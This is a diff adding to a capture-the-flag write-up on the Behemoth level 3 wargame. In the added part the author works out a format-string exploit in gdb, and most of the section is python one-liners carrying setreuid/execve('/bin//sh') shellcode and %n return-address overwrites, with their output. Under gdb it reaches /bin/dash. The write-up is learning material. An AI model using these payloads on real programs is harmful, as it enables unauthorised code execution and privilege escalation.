@@ -260,3 +260,106 @@ Cannot access memory at address 0x80484dc
 ```
 
 It's a beautiful thing.  Let's head to the server.
+
+```
+behemoth3@melinda:/behemoth$ gdb behemoth3
+(gdb) break * 0x80484b2
+Breakpoint 1 at 0x80484b2
+(gdb) break * 0x80484dc
+Breakpoint 2 at 0x80484dc
+(gdb) run
+Starting program: /games/behemoth/behemoth3 
+Identify yourself: AAAA
+
+Breakpoint 1, 0x080484b2 in main ()
+(gdb) x/10x $esp
+0xffffd5e0:	0xffffd5f8	0x000000c8	0xf7fcac20	0x00000000
+0xffffd5f0:	0x00000000	0xf7ffd000	0x41414141	0xf7ff000a
+0xffffd600:	0xffffd6c0	0xf7fe57aa
+(gdb) c
+Continuing.
+Welcome, AAAA
+
+aaaand goodbye again.
+
+Breakpoint 2, 0x080484dc in main ()
+(gdb) x/10x $esp
+0xffffd6cc:	0xf7e3ca63	0x00000001	0xffffd764	0xffffd76c
+0xffffd6dc:	0xf7feacea	0x00000001	0xffffd764	0xffffd704
+0xffffd6ec:	0x08049798	0x08048230
+```
+
+Ok, on the server our input starts at ```0xffffd5f8``` (shellcode at ```0xffffd614```) with our return address at ```0xffffd6cc```.  Note to self, do this on the server the first time around.  Looks like we have to recalculate everything.
+
+```
+behemoth3@melinda:/behemoth$ mktemp -d
+/tmp/tmp.klO9V3AtZQ
+behemoth3@melinda:/behemoth$ cd /tmp/tmp.klO9V3AtZQ
+behemoth3@melinda:/tmp/tmp.klO9V3AtZQ$ python -c 'print "\xcc\xd6\xff\xffJUNK\xcd\xd6\xff\xffJUNK\xce\xd6\xff\xffJUNK\xcf\xd6\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%8x%n"' > input
+```
+```
+(gdb) run < /tmp/tmp.klO9V3AtZQ/input
+Starting program: /games/behemoth/behemoth3 < /tmp/tmp.klO9V3AtZQ/input
+Identify yourself: Welcome, ����JUNK����JUNK����JUNK����1ۍC�̀1�Qhn/shh//bi�A
+                                                                            ��̀c8f7fcac2000f7ffd000
+
+aaaand goodbye again.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000004c in ?? ()
+```
+ 
+ A few quick calculations to reproduce our numbers.
+ 
+ ```
+(gdb) p 0x114 - 0x4c + 8
+$1 = 208
+(gdb) p 0x1d6 - 0x114
+$2 = 194
+(gdb) p 0x1ff - 0x1d6
+$3 = 41
+(gdb) p 0x2ff - 0x1ff
+$4 = 256
+ ```
+ 
+ And let's try to run it.
+
+```
+behemoth3@melinda:/behemoth$ python -c 'print "\xcc\xd6\xff\xffJUNK\xcd\xd6\xff\xffJUNK\xce\xd6\xff\xffJUNK\xcf\xd6\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%208x%n%194x%n%41x%n%256x%n"' | ./behemoth3 
+Identify yourself: Welcome, ����JUNK����JUNK����JUNK����1ۍC�̀1�Qhn/shh//bi�A
+                                                                            ��̀c8f7fcac20f7ff2eb62                                                                                                                                                                                                        f7ffd000                                                                                                                                                                                          4b4e554a                                 4b4e554a                                                                                                                                                                                                                                                        4b4e554a
+
+aaaand goodbye again.
+```
+
+Hmm...no errors, but no command prompt.  Let's try our bash tricks.
+
+```
+behemoth3@melinda:/behemoth$ (python -c 'print "\xcc\xd6\xff\xffJUNK\xcd\xd6\xff\xffJUNK\xce\xd6\xff\xffJUNK\xcf\xd6\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%208x%n%194x%n%41x%n%256x%n"';cat) | ./behemoth3 
+Identify yourself: Welcome, ����JUNK����JUNK����JUNK����1ۍC�̀1�Qhn/shh//bi�A
+                                                                            ��̀c8f7fcac20f7ff2eb62                                                                                                                                                                                                        f7ffd000                                                                                                                                                                                          4b4e554a                                 4b4e554a                                                                                                                                                                                                                                                        4b4e554a
+
+aaaand goodbye again.
+whoami
+behemoth3@melinda:/behemoth$
+```
+
+Well, that kept a prompt open for the ```cat``` command, but didn't seem to execute anything in our shell.  Let's open up gdb and see what's going on.
+
+```
+behemoth3@melinda:/behemoth$ mktemp -d
+/tmp/tmp.klO9V3AtZQ
+behemoth3@melinda:/tmp/tmp.klO9V3AtZQ$ python -c 'print "\xcc\xd6\xff\xffJUNK\xcd\xd6\xff\xffJUNK\xce\xd6\xff\xffJUNK\xcf\xd6\xff\xff"+"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"+"%x"*4+"%208x%n%194x%n%41x%n%256x%n"' > input
+```
+``` 
+(gdb) run < /tmp/tmp.klO9V3AtZQ/input
+Starting program: /games/behemoth/behemoth3 < /tmp/tmp.klO9V3AtZQ/input
+Identify yourself: Welcome, ����JUNK����JUNK����JUNK����1ۍC�̀1�Qhn/shh//bi�A
+                                                                            ��̀c8f7fcac2000                                                                                                                                                                                                        f7ffd000                                                                                                                                                                                          4b4e554a                                 4b4e554a                                                                                                                                                                                                                                                        4b4e554a
+
+aaaand goodbye again.
+process 21053 is executing new program: /bin/dash
+[Inferior 1 (process 21053) exited normally]
+```
+
+Well, it sure does look like it should be working.  More debugging to do.
